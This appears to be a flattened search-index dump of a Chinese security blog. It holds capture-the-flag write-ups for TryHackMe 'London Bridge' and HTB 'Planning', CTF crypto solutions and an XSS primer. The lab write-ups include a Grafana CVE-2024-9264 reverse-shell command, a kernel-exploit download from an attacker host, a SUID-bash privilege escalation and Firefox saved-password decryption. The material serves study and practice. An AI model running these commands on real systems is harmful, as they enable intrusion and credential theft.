:: Threads : 50 :: Matcher : Response status: all :: Filter : Response size: 823 ________________________________________________ www [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 544ms] :: Progress: [20469/20469] :: Job [1/1] :: 184 req/s","date":"2025-05-26","objectID":"/thm-the-london-bridge/:2:0","tags":["渗透"],"title":"THM the London Bridge","uri":"/thm-the-london-bridge/"},{"categories":["靶场"],"content":"提权 beth@london:~$ uname -a Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 内核很老了，先linpeas.sh启动(懒得自己找cve了) [+] [CVE-2018-18955] subuid_shell Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712 Exposure: probable Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28} Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip Comments: CONFIG_USER_NS needs to be enabled 本地dump下来，靶机下载 wget -r -np -nH --cut-dirs=1 http://10.21.155.141:8000/ beth@london:/tmp/poc$ bash exploit.dbus.sh [*] Compiling... [*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service... [.] starting [.] setting up namespace [~] done, namespace sandbox set up [.] mapping subordinate ids [.] subuid: 100000 [.] subgid: 100000 [~] done, mapped subordinate ids [.] executing subshell [*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf... [.] starting [.] setting up namespace [~] done, namespace sandbox set up [.] mapping subordinate ids [.] subuid: 100000 [.] subgid: 100000 [~] done, mapped subordinate ids [.] executing subshell [*] Launching dbus service... Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken. [+] Success: -rwsrwxr-x 1 root root 8392 May 24 06:50 /tmp/sh [*] Cleaning up... [*] Launching root shell: /tmp/sh root@london:/tmp/poc# id uid=0(root) gid=0(root) groups=0(root),1000(beth) 成功拿到root root@london:/root# ls -la total 52 drwx------ 6 root root 4096 Apr 23 2024 . drwxr-xr-x 23 root root 4096 Apr 7 2024 .. lrwxrwxrwx 1 root root 9 Sep 18 2023 .bash_history -\u003e /dev/null -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwx------ 3 root root 4096 Apr 23 2024 .cache -rw-r--r-- 1 beth beth 2246 Mar 16 2024 flag.py -rw-r--r-- 1 beth beth 2481 Mar 16 2024 flag.pyc drwx------ 3 root root 4096 Apr 23 2024 .gnupg drwxr-xr-x 3 root root 4096 Sep 16 2023 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile drwxr-xr-x 2 root root 4096 Mar 16 2024 __pycache__ -rw-rw-r-- 1 root root 27 Sep 18 2023 .root.txt -rw-r--r-- 1 root root 66 Mar 10 2024 .selected_editor -rw-r--r-- 1 beth beth 175 Mar 16 2024 test.py ","date":"2025-05-26","objectID":"/thm-the-london-bridge/:3:0","tags":["渗透"],"title":"THM the London Bridge","uri":"/thm-the-london-bridge/"},{"categories":["靶场"],"content":"第三个账户的密码 root@london:/root# ls /home beth charles root@london:/root# cd /home/charles/ root@london:/home/charles# ls root@london:/home/charles# ls -la total 24 drw------- 3 charles charles 4096 Apr 23 2024 . drwxr-xr-x 4 root root 4096 Mar 10 2024 .. lrwxrwxrwx 1 root root 9 Apr 23 2024 .bash_history -\u003e /dev/null -rw------- 1 charles charles 220 Mar 10 2024 .bash_logout -rw------- 1 charles charles 3771 Mar 10 2024 .bashrc drw------- 3 charles charles 4096 Mar 16 2024 .mozilla -rw------- 1 charles charles 807 Mar 10 2024 .profile root@london:/home/charles# cd .mozilla root@london:/home/charles/.mozilla# ls -la total 12 drw------- 3 charles charles 4096 Mar 16 2024 . drw------- 3 charles charles 4096 Apr 23 2024 .. drw------- 3 charles charles 4096 Mar 16 2024 firefox root@london:/home/charles/.mozilla# cd firefox/ root@london:/home/charles/.mozilla/firefox# ls -la total 12 drw------- 3 charles charles 4096 Mar 16 2024 . drw------- 3 charles charles 4096 Mar 16 2024 .. drw------- 16 charles beth 4096 Mar 16 2024 8k3bf3zp.charles 这个东西以前没有遇到过，主要是火狐浏览器的信息恢复，可以在网上找到脚本去恢复，先吧文件dump到本地 tar -cvzf /tmp/firefox.tar.gz firefox scp -i id_rsa beth@10.10.207.41:/tmp/firefox.tar.gz . 然后去运行脚本恢复 python3 firefox_decrypt/firefox_decrypt.py firefox/8k3bf3zp.charles ─╯ 2025-05-24 22:00:27,307 - WARNING - profile.ini not found in firefox/8k3bf3zp.charles 2025-05-24 22:00:27,307 - WARNING - Continuing and assuming 'firefox/8k3bf3zp.charles' is a profile location Website: https://www.buckinghampalace.com Username: 'Charles' Password: 'thekingofengland' ","date":"2025-05-26","objectID":"/thm-the-london-bridge/:4:0","tags":["渗透"],"title":"THM the London Bridge","uri":"/thm-the-london-bridge/"},{"categories":["靶场"],"content":"总结 这个靶机主要是信息收集和ssrf，提权部分并没有特别多花里胡哨的操作，主要是文件上传和下载比较值得注意，你也不想文件都dump不下来吧～ ","date":"2025-05-26","objectID":"/thm-the-london-bridge/:5:0","tags":["渗透"],"title":"THM the London Bridge","uri":"/thm-the-london-bridge/"},{"categories":["靶场"],"content":"前言 好久没打靶机了，昨天睿抗校赛摸鱼打了一半，回宿舍打完了 ","date":"2025-05-25","objectID":"/htb-planning/:1:0","tags":["渗透"],"title":"HTB Planning","uri":"/htb-planning/"},{"categories":["靶场"],"content":"外网打点 ❯ nmap -sC -sV 10.10.11.68 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 14:57 CST Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.99% done; ETC: 14:58 (0:00:00 remaining) Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.99% done; ETC: 14:58 (0:00:00 remaining) Nmap scan report for 10.10.11.68 Host is up (0.26s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA) |_ 256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519) 80/tcp open http nginx 1.24.0 (Ubuntu) |_http-title: Did not follow redirect to http://planning.htb/ |_http-server-header: nginx/1.24.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.18 seconds 把域名加到/etc/hosts里面，访问一下，发现没有明显的目标，扫目录 ❯ python dirsearch.py -u http://planning.htb Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12290 Target: http://planning.htb/ [15:03:45] Scanning: [15:04:03] 200 - 12KB - /about.php [15:04:30] 200 - 10KB - /contact.php [15:04:31] 301 - 178B - /css -\u003e http://planning.htb/css/ [15:04:43] 301 - 178B - /img -\u003e http://planning.htb/img/ [15:04:44] 200 - 23KB - /index.php [15:04:48] 403 - 564B - /js/ [15:04:48] 301 - 178B - /js -\u003e http://planning.htb/js/ [15:04:49] 301 - 178B - /lib -\u003e http://planning.htb/lib/ [15:04:49] 403 - 564B - /lib/ Task Completed 依旧没有有用的信息，后面上了个字典也没扫出来东西，爆一下子域名试试 ❯ ./ffuf -w /home/zsm/fuzzDicts-Pro/subdomainDicts/main.txt -u 'http://10.10.11.68' -H \"Host:FUZZ.planning.htb\" -fs 178 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0 ________________________________________________ :: Method : GET :: URL : http://10.10.11.68 :: Wordlist : FUZZ: /home/zsm/fuzzDicts-Pro/subdomainDicts/main.txt :: Header : Host: FUZZ.planning.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 178 ________________________________________________ grafana [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 268ms] 扫出来一个，加到本地，访问，是个grafana的login页面，htb给了账号密码admin / 0D5oT70Fq13EvB5r，进去，同时看见版本是v11，网上找一下有没有cve，CVE-2024-9264，dump下来直接打 sudo python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 你的ip --reverse-port 你的port [SUCCESS] Login successful! Reverse shell payload sent successfully! Set up a netcat listener on port 这里本地是mac，一定要加上sudo才可以跑，成功拿到shell Connection from 10.10.11.68:33462 sh: 0: can't access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) # ls LICENSE bin conf public # env GF_PATHS_HOME=/usr/share/grafana HOSTNAME=7ce659d667d7 AWS_AUTH_EXTERNAL_ID= SHLVL=1 HOME=/usr/share/grafana AWS_AUTH_AssumeRoleEnabled=true GF_PATHS_LOGS=/var/log/grafana _=ls GF_PATHS_PROVISIONING=/etc/grafana/provisioning GF_PATHS_PLUGINS=/var/lib/grafana/plugins PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin AWS_AUTH_AllowedAuthProviders=default,keys,credentials GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT! AWS_AUTH_SESSION_DURATION=15m GF_SECURITY_ADMIN_USER=enzo GF_PATHS_DATA=/var/lib/grafana GF_PATHS_CONFIG=/etc/grafana/grafana.ini AWS_CW_LIST_METRICS_PAGE_LIMIT=500 PWD=/usr/share/grafana docker逃逸？哦，有ssh，密码账号(enzo/RioTecRANDEntANT!)直接登录，拿到flag enzo@planning:~$ ls user.txt ","date":"2025-05-25","objectID":"/htb-planning/:2:0","tags":["渗透"],"title":"HTB Planning","uri":"/htb-planning/"},{"categories":["靶场"],"content":"提权 先传linpeas上去，没什么明显的漏洞，翻一下经常有问题的目录，成功找到 enzo@planning:/opt/crontabs$ cat crontab.db {\"name\":\"Grafana backup\",\"command\":\"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar \u0026\u0026 /usr/bin/gzip /var/backups/grafana.tar \u0026\u0026 zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz \u0026\u0026 rm /var/backups/grafana.tar.gz\",\"schedule\":\"@daily\",\"stopped\":false,\"timestamp\":\"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)\",\"logging\":\"false\",\"mailing\":{},\"created\":1740774983276,\"saved\":false,\"_id\":\"GTI22PpoJNtRKg0W\"} {\"name\":\"Cleanup\",\"command\":\"/root/scripts/cleanup.sh\",\"schedule\":\"* * * * *\",\"stopped\":false,\"timestamp\":\"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)\",\"logging\":\"false\",\"mailing\":{},\"created\":1740849309992,\"saved\":false,\"_id\":\"gNIRXh1WIc9K7BYX\"} 有个密码，尝试拿这个登录root，发现不行，继续信息收集 enzo@planning:/opt/crontabs$ netstat -tunlp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33153 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.54:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.54:53 0.0.0.0:* - udp 0 0 127.0.0.53:53 0.0.0.0:* - 8000转发到本地 ssh -L 8000:127.0.0.1:8000 enzo@planning.htb 上去看看，是个登录页面，拿root/P4ssw0rdS0pRi0T3c进入，是个web控制器，可以增加定时任务，写个经典payload进去 cp /bin/bash /tmp/bash \u0026\u0026 chmod u+s /tmp/bash 在web页面启动一下这一条，然后 enzo@planning:/tmp$ ll total 1464 drwxrwxrwt 12 root root 4096 May 24 07:54 ./ drwxr-xr-x 22 root root 4096 Apr 3 14:40 ../ -rwsr-xr-x 1 root root 1446024 May 24 07:54 bash* -rw-r--r-- 1 root root 0 May 24 07:54 Eceg9Qo0F31AOXNc.stderr -rw-r--r-- 1 root root 0 May 24 07:54 Eceg9Qo0F31AOXNc.stdout drwxrwxrwt 2 root root 4096 May 24 07:50 .font-unix/ drwxrwxrwt 2 root root 4096 May 24 07:50 .ICE-unix/ drwx------ 3 root root 4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-ModemManager.service-ukafnm/ drwx------ 3 root root 4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-polkit.service-dvnH4d/ drwx------ 3 root root 4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-systemd-logind.service-7AOUm6/ drwx------ 3 root root 4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-systemd-resolved.service-sb4bu2/ drwx------ 3 root root 4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-systemd-timesyncd.service-c2KwUc/ drwx------ 2 root root 4096 May 24 07:51 vmware-root_736-2991268455/ drwxrwxrwt 2 root root 4096 May 24 07:50 .X11-unix/ drwxrwxrwt 2 root root 4096 May 24 07:50 .XIM-unix/ -rw-r--r-- 1 root root 0 May 24 07:54 YvZsUUfEXayH6lLj.stderr -rw-r--r-- 1 root root 0 May 24 07:54 YvZsUUfEXayH6lLj.stdout enzo@planning:/tmp$ ./bash -p bash-5.2# id uid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo) bash-5.2# cd /root bash-5.2# ls root.txt scripts game over~ ","date":"2025-05-25","objectID":"/htb-planning/:3:0","tags":["渗透"],"title":"HTB Planning","uri":"/htb-planning/"},{"categories":["靶场"],"content":"总结 被一些小点卡的莫名其妙的，还是太菜了。 这个靶机就是典型的信息收集的，只要收集完了就百分百能出，没有过多的技巧和代码审计 ","date":"2025-05-25","objectID":"/htb-planning/:4:0","tags":["渗透"],"title":"HTB Planning","uri":"/htb-planning/"},{"categories":["CTF"],"content":"前言 和睿抗校赛撞了，赛后看看题复现一下，感觉质量很一般 ","date":"2025-05-25","objectID":"/huangheliuyu/:1:0","tags":["crypto"],"title":"黄河流域CTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"题目 ","date":"2025-05-25","objectID":"/huangheliuyu/:2:0","tags":["crypto"],"title":"黄河流域CTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"Latice task.py from Crypto.Util.number import * from Crypto.Cipher import AES import os from secret import flag import numpy as np def gen(q, n, N, sigma): t = np.random.randint(0, high=q // 2, size=n) s = np.concatenate([np.ones(1, dtype=np.int32), t]) A = np.random.randint(0, high=q // 2, size=(N, n)) e = np.round(np.random.randn(N) * sigma**2).astype(np.int32) % q b = ((np.dot(A, t) + e).reshape(-1, 1)) % q P = np.hstack([b, -A]) return P, s def enc(P, M, q): N = P.shape[0] n = len(M) r = np.random.randint(0, 2, (n, N)) Z = np.zeros((n, P.shape[1]), dtype=np.int32) Z[:, 0] = 1 C = np.zeros((n, P.shape[1]), dtype=np.int32) for i in range(n): C[i] = (np.dot(P.T, r[i]) + (np.floor(q / 2) * Z[i] * M[i])) % q return C q = 127 n = 3 N = int(1.1 * n * np.log(q)) sigma = 1.0 P, s = gen(q, n, N, sigma) def prep(s): return np.array([int(b) for char in s for b in f\"{ord(char):08b}\"], dtype=np.int32) C = enc(P, prep(hint), q) P = P.tolist() C = C.tolist() print(f\"{P=}\") print(f\"{C=}\") 第一眼看上去是格+aes，但是注意代码 encrypted = AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(b\"\".join([pad(i.encode(), 16) for i in flag])) flag头已知的情况下，根据CBC的性质，有m[:16]和c[:16]，异或就可以得到iv了 exp.py import numpy as np from Crypto.Cipher import AES leak = -3.257518803980229925210589904230583482986646342139415561576950148286382674434770529248486501793457710730252401258721482142654716015216299244487794967600132597049154513815052213387666360825101667524635777006510550117512116441539852315185793280311905620746025669520152068447372368293640072502196959919309286241 key = encrypted = iv = encrypted[:16] cipher = AES.new(key, AES.MODE_CBC, iv) decrypted = cipher.decrypt(encrypted[16:]) print(decrypted.decode().strip()) ","date":"2025-05-25","objectID":"/huangheliuyu/:2:1","tags":["crypto"],"title":"黄河流域CTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"sandwitch task.py from Crypto.Util.number import * import gmpy2 flag = b'flag{fake_flag}' assert len(flag) == 39 p = getPrime(512) q = getPrime(512) n = p * q e = 0x3 pad1 = b'easy_problem' pad2 = b'How_to_solve_it' c = pow(bytes_to_long(pad1 + flag + pad2),e,n) print(f'n = {n}') print(f'c = {c}') 很经典的copper，高低位已知爆破中间，且已知len(flag)=39和len(pad2)=15，那么就可以写出如下的式子 $$ c = (256^{54}pad_1+256^{15}flag+pad2)^{e} \\mod n $$exp.py from Crypto.Util.number import * import hashlib from tqdm import * def hash(x): return hashlib.sha256(x.encode()).digest() e = 3 n = c = pad1 = b'easy_problem' pad2 = b'How_to_solve_it' pad1 = bytes_to_long(pad1) pad2 = bytes_to_long(pad2) PR.\u003cx\u003e = PolynomialRing(Zmod(n)) f = (pad1 * 256 ** 54 + x * 256 ** 15 + pad2 )^e - c f = f.monic() res = f.small_roots(X=256^39,beta=1,epsilon=0.04) if(res != []): print(long_to_bytes(int(res[0]))) ","date":"2025-05-25","objectID":"/huangheliuyu/:2:2","tags":["crypto"],"title":"黄河流域CTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"Happy task.py import os, utils from secret import flag assert flag.startswith(b'flag{') and flag.endswith(b'}') seed = int(os.urandom(16).hex(), 16) gen = utils.Gen(seed) msg = b'Happy4321: ' + flag enc = bytes(m ^ next(gen) for m in msg).hex() print(enc) utils.py class Gen: def __init__(self, state): self.nbits = 128 self.state = state \u0026 ((1 \u003c\u003c self.nbits) - 1) self.mask = 109908700282042807039366676242995409413 def func0(self, steps=1): for _ in range(steps): res = self.state \u0026 self.mask bit = sum([(res \u003e\u003e i) \u0026 1 for i in range(self.nbits)]) \u0026 1 self.state = ((self.state \u003c\u003c 1) ^ bit) \u0026 ((1 \u003c\u003c self.nbits) - 1) return bit def __next__(self): out = 0 for _ in range(8): bit = self.func0(2023) out = (out \u003c\u003c 1) ^ bit return out 和NKCTF2023的题差不多，而且难度减小了一点点，参考XMCVE exp.py # SageMath class Gen: def __init__(self, state): self.nbits = 128 self.state = state \u0026 ((1 \u003c\u003c self.nbits) - 1) self.mask = 109908700282042807039366676242995409413 def func0(self, steps=1): for _ in range(steps): res = self.state \u0026 self.mask bit = sum([(res \u003e\u003e i) \u0026 1 for i in range(self.nbits)]) \u0026 1 self.state = ((self.state \u003c\u003c 1) ^ bit) \u0026 ((1 \u003c\u003c self.nbits) - 1) return bit def __next__(self): out = 0 for _ in range(8): bit = self.func0(2023) out = (out \u003c\u003c 1) ^ bit return out n = 128 msg = b'Happy4321: flag{' mask = 109908700282042807039366676242995409413 enc = '' enc = bytes.fromhex(enc) Round = 2023 # 构建M矩阵 M = matrix(GF(2), n, n) for i in range(n): if i+1\u003cn: M[i+1, i] = 1 if mask\u0026(1\u003c\u003c(n-i-1)): M[i, -1] = 1 else: M[i, -1] = 0 # seed * M2 = output_s M2 = matrix(GF(2), n, n) for i in range(n): tmp = M^(Round*(i+1)) for y in range(n): M2[y, i] = tmp[y, -1] # 构建output_s矩阵 output_s = [] for i in range(len(msg)): tmp = msg[i]^^enc[i] for x in range(8): if tmp\u0026(1\u003c\u003c(8-x-1)): output_s.append(1) else: output_s.append(0) output_s = vector(GF(2), output_s) S = M2.solve_left(output_s) seed = int(''.join([str(each) for each in S]), 2) print(seed) import os enc = '' enc = bytes.fromhex(enc) seed = 16527323701539137374460041583215952894 gen = Gen(seed) flag = bytes(c ^ next(gen) for c in enc) print(flag) ","date":"2025-05-25","objectID":"/huangheliuyu/:2:3","tags":["crypto"],"title":"黄河流域CTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"因式分解 task.py from Crypto.Util.number import * from gmpy2 import* from secret import flag,a,b,c m = bytes_to_long(flag) p = getPrime(256) q = getPrime(256) n = p * q e = 65537 _q = int(bin(q)[2:][::-1] , 2) c = pow(m,e,n) print('n =',n) print('c =',c) assert a**3+b**3+c**3 == 3*a*b*c gift = secert**3 - 9*secert + 8 print(gift) assert 3*(p ^ _q) == a + b + c tellasecret.py import string from secret import hint from secret import encrypt import random dicts = string.ascii_lowercase +\"{=}\" key = (''.join([random.choice(dicts) for i in range(4)])) * 8 assert(len(hint) == 32) assert(len(key) == 32) cipher = encrypt(hint, key) print(cipher) 这个东西我是真的看不懂，没get到他到底想让我干什么，对于_q肯定是个剪枝了，可以参考鸡块神的文章，但是这个serect我是真的没看懂，看了别的师傅的博客我才知道是维吉尼亚爆破，真难绷 exp1.py from itertools import product dicts = \"abcdefghijklmnopqrstuvwxyz{=}\" cipher = \"cp=wmaunapgimjfpopeblvup=aywqygb\" # 暴力破解 4 字节 key for key in product(dicts, repeat=4): key = ''.join(key) * 8 plain = '' for i in range(len(cipher)): c = dicts.index(cipher[i]) k = dicts.index(key[i]) p = (c - k) % 29 plain += dicts[p] if \"secret\" in plain: print(\"Key:\", key[:4]) print(\"Plaintext:\", plain) break # tellasecret{a=secert}keepsilentt 这是第一部分，那么就解出来a=secert，看abc的关系式，很经典的轮换式，直接想到a=b=c，那么可知p^_q=a，解方程求a然后剪枝就行了 exp2.py gift = k = var('secret') p = k polys = (p**3 - 9*p + 8 == gift) x = solve(polys, k) print(x) from Crypto.Util.number import * import sys sys.setrecursionlimit(1500) pxorq = n = c = e = 65537 pxorq = str(bin(pxorq)[2:]).zfill(256) def find(ph, qh, pl, ql): l = len(ph) tmp0 = ph + (256 - 2 * l) * \"0\" + pl tmp1 = ph + (256 - 2 * l) * \"1\" + pl tmq0 = qh + (256 - 2 * l) * \"0\" + ql tmq1 = qh + (256 - 2 * l) * \"1\" + ql if (int(tmp0, 2) * int(tmq0, 2) \u003e n): return if (int(tmp1, 2) * int(tmq1, 2) \u003c n): return if (int(pl, 2) * int(ql, 2) % (2 ** (l - 1)) != n % (2 ** (l - 1))): return if (l == 128): pp0 = int(tmp0, 2) if (n % pp0 == 0): pf = pp0 qf = n // pp0 phi = (pf - 1) * (qf - 1) d = inverse(e, phi) m1 = pow(c, d, n) print(long_to_bytes(m1)) exit() else: if (pxorq[l] == \"1\" and pxorq[255 - l] == \"1\"): find(ph + \"1\", qh + \"0\", \"1\" + pl, \"0\" + ql) find(ph + \"0\", qh + \"0\", \"1\" + pl, \"1\" + ql) find(ph + \"1\", qh + \"1\", \"0\" + pl, \"0\" + ql) find(ph + \"0\", qh + \"1\", \"0\" + pl, \"1\" + ql) elif (pxorq[l] == \"1\" and pxorq[255 - l] == \"0\"): find(ph + \"1\", qh + \"0\", \"0\" + pl, \"0\" + ql) find(ph + \"0\", qh + \"0\", \"0\" + pl, \"1\" + ql) find(ph + \"1\", qh + \"1\", \"1\" + pl, \"0\" + ql) find(ph + \"0\", qh + \"1\", \"1\" + pl, \"1\" + ql) elif (pxorq[l] == \"0\" and pxorq[255 - l] == \"1\"): find(ph + \"0\", qh + \"0\", \"1\" + pl, \"0\" + ql) find(ph + \"0\", qh + \"1\", \"0\" + pl, \"0\" + ql) find(ph + \"1\", qh + \"0\", \"1\" + pl, \"1\" + ql) find(ph + \"1\", qh + \"1\", \"0\" + pl, \"1\" + ql) elif (pxorq[l] == \"0\" and pxorq[255 - l] == \"0\"): find(ph + \"0\", qh + \"0\", \"0\" + pl, \"0\" + ql) find(ph + \"1\", qh + \"0\", \"0\" + pl, \"1\" + ql) find(ph + \"0\", qh + \"1\", \"1\" + pl, \"0\" + ql) find(ph + \"1\", qh + \"1\", \"1\" + pl, \"1\" + ql) find(\"1\", \"1\", \"1\", \"1\") ","date":"2025-05-25","objectID":"/huangheliuyu/:2:4","tags":["crypto"],"title":"黄河流域CTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"总结 题目质量还行吧？因式分解这玩意前面是维吉尼亚真没想到xd ","date":"2025-05-25","objectID":"/huangheliuyu/:3:0","tags":["crypto"],"title":"黄河流域CTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"XSS原理 XSS的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。 ","date":"2025-05-09","objectID":"/study_xss/:1:0","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"XSS攻击类型 根据XSS脚本注入方式的不同，我们可以将XSS攻击简单的分类为反射型XSS、存储型XSS、DOM-based 型。 ","date":"2025-05-09","objectID":"/study_xss/:2:0","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"反射型XSS 又称为非持久型XSS。 流程：发出请求(XSS代码嵌套进URL)–\u003e服务端解析并且响应–\u003e传回给浏览器并且解析 特点： 即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据 攻击者需要受害者\"配合\" 难发现，难修复，难收录() 盗取用户敏感保密信息 ","date":"2025-05-09","objectID":"/study_xss/:2:1","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"存储型XSS 又称为持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端，下次不用再去提交XSS代码 一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。 这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。 特点： 持久性，直接打到数据库里面 危害大。甚至可以把用户机器变成肉鸡去造成危害 盗取用户敏感信息 ","date":"2025-05-09","objectID":"/study_xss/:2:2","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"DOM-based 型 客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。 ","date":"2025-05-09","objectID":"/study_xss/:2:3","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"代码解析 ","date":"2025-05-09","objectID":"/study_xss/:3:0","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"DOM\u0026HTML标记 浏览器收到代码，先构建DOM树和解析HTML。 HTML标记解析一般比较快，包含了开始结束属性名和值，解析之后构建了文档树。 DOM树主要是描述文档的内容，可以反应标记之间的关系和层次结构。DOM节点越多，构建时间越长。不过有个特别的点，比如加载到一个img资源，会请求这个资源，并且下载，但是整个过程是异步的，浏览器会继续解析和生产HTML部分，并不会等待img下载完 ","date":"2025-05-09","objectID":"/study_xss/:3:1","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"JavaScript的解析 顺序：HTML解析到JavaScript部分的时候，HTML会停止解析，控制权到JavaScript引擎，执行代码后再继续解析HTML。 缺点：如果JavaScript的代码运行过长，就会有负面影响，所以就会有异步(async/await)去处理。当JavaScript代码执行时，如果该代码修改了DOM结构或样式，可能会触发浏览器重新构建DOM树和应用样式，从而导致页面的重绘和回流，影响页面的性能。 浏览器方面：当遇到\u003cscript\u003e标签，就会停止HTML解析，进行JavaScript解析。遇到URL协议or事件属性的标记时，交给JavaScript去解析，如果还不行就会报错，这也就是为什么有时候在某个页面插入了XSS弹窗后，假如你不点击你的弹窗的相应的操作，某些元素就无法进行加载。 ","date":"2025-05-09","objectID":"/study_xss/:3:2","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"CSS代码的解析 在遇到CSS代码时，浏览器不会像JavaScript代码一样去停止HTML标记的解析，相反它会继续进行HTML代码的解析，并且将CSS代码交给CSS引擎来进行处理。 ","date":"2025-05-09","objectID":"/study_xss/:3:3","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"关于解码 